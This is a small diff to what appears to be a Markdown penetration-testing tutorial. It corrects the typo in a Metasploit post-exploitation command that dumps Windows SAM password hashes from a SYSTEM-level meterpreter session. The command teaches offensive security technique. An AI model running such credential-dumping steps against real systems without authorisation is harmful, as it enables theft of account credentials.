@@ -201,7 +201,7 @@ The meterpreter session is now running with **SYSTEM** privileges (**NT AUTHORIT
 
 Let's try to obtain the **hashes** located in the **SAM** file of Windows 10 by typing:
 
-`run post/windows/gather/smarth_hashdump`
+`run post/windows/gather/smart_hashdump`
 
 ![getSystem](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/hashdump.png)
 
